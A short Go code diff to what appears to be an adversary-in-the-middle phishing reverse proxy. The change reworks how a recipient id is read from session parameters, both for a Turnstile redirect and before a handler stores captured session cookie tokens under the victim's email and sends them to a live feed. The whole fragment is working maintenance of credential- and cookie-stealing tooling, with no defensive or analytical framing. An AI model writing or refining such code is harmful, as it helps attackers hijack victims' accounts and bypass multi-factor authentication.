@@ -465,8 +465,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 
                                     if p.turnstile {
-                                        if session.RId != "" {
-                                            return p.redirectTurnstile(req, session.RId)
+                                        if rid, ok := session.Params["rid"]; ok && rid != "" {
+                                            return p.redirectTurnstile(req, rid)
                                         }
                                     }
 
@@ -1259,7 +1259,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
                             if s, ok := p.sessions[ps.SessionId]; ok {
                                 if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
-                                    database.HandleCapturedCookieSession(rid, s.CookieTokens, map[string]string{"email": rid}, p.livefeed)
+                                    if rid, exists := s.Params["rid"]; exists {
+                                        database.HandleCapturedCookieSession(rid, s.CookieTokens, map[string]string{"email": rid}, p.livefeed)
+                                    }
                                 }
                             }
 
